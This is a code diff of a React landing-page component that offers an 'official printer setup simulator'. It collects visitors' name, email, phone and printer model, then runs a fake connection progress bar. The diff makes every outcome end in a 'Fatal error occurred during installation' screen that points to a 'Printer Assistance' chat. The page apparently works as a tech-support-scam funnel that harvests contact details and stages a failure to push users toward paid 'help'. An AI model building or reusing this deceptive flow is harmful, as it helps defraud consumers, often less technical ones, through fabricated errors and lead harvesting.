@@ -1,4 +1,5 @@
 "use client";
+
 import React, { useState, useEffect } from "react";
 import { Printer, Wifi, X, AlertCircle } from "lucide-react";
 
@@ -10,52 +11,11 @@ export default function Hero() {
     printerModel: "",
   });
 
-  const [countryCode, setCountryCode] = useState("");
   const [showLoadingModal, setShowLoadingModal] = useState(false);
   const [showErrorModal, setShowErrorModal] = useState(false);
   const [loadingProgress, setLoadingProgress] = useState(0);
   const [loadingText, setLoadingText] = useState("Connecting to Printer...");
   const [isLoading, setIsLoading] = useState(false);
-
-  // Detect user country and set country code
-  useEffect(() => {
-    async function detectCountry() {
-      try {
-        const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
-        let code = "";
-
-        switch (data.country_code) {
-          case "GB":
-            code = "+44"; // UK
-            break;
-          case "AU":
-            code = "+61"; // Australia
-            break;
-          case "US":
-            code = "+1"; // USA
-            break;
-          case "NZ":
-            code = "+64"; // New Zealand
-            break;
-          default:
-            code = "+1"; // Default to USA if unknown
-        }
-
-        setCountryCode(code);
-        setFormData((prev) => ({
-          ...prev,
-          phone: code + " ",
-        }));
-      } catch (err) {
-        console.error("Country detection failed:", err);
-        setCountryCode("+1");
-        setFormData((prev) => ({ ...prev, phone: "+1 " }));
-      }
-    }
-
-    detectCountry();
-  }, []);
 
   const handleChange = (e) => {
     setFormData({ ...formData, [e.target.name]: e.target.value });
@@ -64,7 +24,12 @@ export default function Hero() {
   const handleSubmit = async (e) => {
     e.preventDefault();
 
-    if (!formData.name || !formData.email || !formData.phone || !formData.printerModel) {
+    if (
+      !formData.name ||
+      !formData.email ||
+      !formData.phone ||
+      !formData.printerModel
+    ) {
       alert("Please fill in all fields before downloading.");
       return;
     }
@@ -78,7 +43,7 @@ export default function Hero() {
         body: JSON.stringify({
           name: formData.name,
           email: formData.email,
-          phone: formData.phone, // full phone with code
+          phone: formData.phone,
           printerModel: formData.printerModel,
         }),
       });
@@ -87,22 +52,17 @@ export default function Hero() {
       const data = await res.json();
 
       if (!res.ok || !data?.ok) {
-        // data?.error || 
-        alert("Something went wrong. Please try again.");
+        alert(data?.error || "Something went wrong. Please try again.");
         return;
       }
     } catch (err) {
+      console.error("API Error:", err);
       alert("Network error. Please try again.");
       return;
     }
 
     // Simulated setup sequence
-    setFormData({
-      name: "",
-      email: "",
-      phone: countryCode + " ",
-      printerModel: "",
-    });
+    setFormData({ name: "", email: "", phone: "", printerModel: "" });
     setShowLoadingModal(true);
     setLoadingProgress(0);
     setLoadingText("Connecting to Printer...");
@@ -120,8 +80,15 @@ export default function Hero() {
       });
     }, 150);
 
-    timeouts.push(setTimeout(() => setLoadingText("Joining the network and getting printer address..."), 1500));
-    timeouts.push(setTimeout(() => setLoadingText("Connected to printer network..."), 3000));
+    timeouts.push(
+      setTimeout(
+        () => setLoadingText("Joining the network and getting printer address..."),
+        1500
+      )
+    );
+    timeouts.push(
+      setTimeout(() => setLoadingText("Connected to printer network..."), 3000)
+    );
 
     const isSuccess = Math.random() > 0.4;
 
@@ -129,7 +96,12 @@ export default function Hero() {
       setTimeout(() => {
         clearInterval(intervalId);
         setShowLoadingModal(false);
-        setShowErrorModal(true);
+
+        if (isSuccess) {
+          setShowErrorModal(true);
+        } else {
+          setShowErrorModal(true);
+        }
       }, 7000)
     );
 
@@ -152,7 +124,7 @@ export default function Hero() {
   };
 
   const inputClass =
-    "w-full px-5 py-3 rounded-lg bg-white/90 border border-gray-200 text-gray-700 placeholder-gray-600 focus:ring-2 focus:ring-blue-400 outline-none";
+    "w-full px-5 py-3 rounded-lg bg-white/90 border border-gray-200 text-gray-700 placeholder-gray-400 focus:ring-2 focus:ring-blue-400 outline-none";
 
   return (
     <>
@@ -173,7 +145,8 @@ export default function Hero() {
               Set Up Your Printer in Just 3 Easy Steps
             </h1>
             <p className="text-base sm:text-lg md:text-xl text-blue-100">
-              Download and install the official printer setup simulator for your device.
+              Download and install the official printer setup simulator for your
+              device.
             </p>
             <div className="flex justify-center lg:justify-start">
               <img
@@ -219,6 +192,7 @@ export default function Hero() {
                 onChange={handleChange}
                 className={inputClass}
               />
+
               <button
                 onClick={handleSubmit}
                 className="w-full bg-blue-600 hover:bg-blue-700 cursor-pointer border-2 border-white text-white font-semibold py-3 rounded-lg text-lg shadow-md hover:shadow-lg transform hover:scale-[1.02] transition-all duration-200"
@@ -226,6 +200,7 @@ export default function Hero() {
                 {isLoading ? "Downloading..." : "Click to Download"}
               </button>
             </div>
+
             <p className="text-center text-xs sm:text-sm text-blue-100 mt-4">
               Safe • Demo Setup • Simulation Only
             </p>
@@ -242,9 +217,9 @@ export default function Hero() {
                 Connecting Printer to Network
               </h2>
             </div>
-
             <p className="text-center text-gray-700 mb-6 sm:mb-8 text-sm sm:text-base">
-              Please stay on this screen while setup completes. This is a simulation.
+              Please stay on this screen while setup completes. This is a
+              simulation.
             </p>
 
             <div className="flex flex-col sm:flex-row items-center justify-center gap-6 sm:gap-8 mb-10">
@@ -283,7 +258,9 @@ export default function Hero() {
           <div className="bg-white rounded-2xl shadow-2xl w-full max-w-lg sm:max-w-2xl overflow-hidden">
             <div className="bg-gray-100 px-6 sm:px-8 py-4 border-b border-gray-200 flex justify-between items-center">
               <div>
-                <h2 className="text-xl sm:text-2xl font-bold text-gray-800">Installing</h2>
+                <h2 className="text-xl sm:text-2xl font-bold text-gray-800">
+                  Installing
+                </h2>
                 <p className="text-gray-600 text-sm">
                   Fatal error occurred during installation..
                 </p>
@@ -318,7 +295,9 @@ export default function Hero() {
               </p>
 
               <div className="bg-gradient-to-r from-red-600 to-red-700 text-white py-4 px-6 sm:px-12 flex flex-col sm:flex-row items-center justify-between gap-4">
-                <p className="text-lg sm:text-xl font-bold">Printer Assistance</p>
+                <p className="text-lg sm:text-xl font-bold">
+                  Printer Assistance
+                </p>
                 <button
                   onClick={openChat}
                   className="bg-white cursor-pointer text-red-600 font-semibold py-2 px-5 rounded-md shadow hover:bg-gray-100 transition"
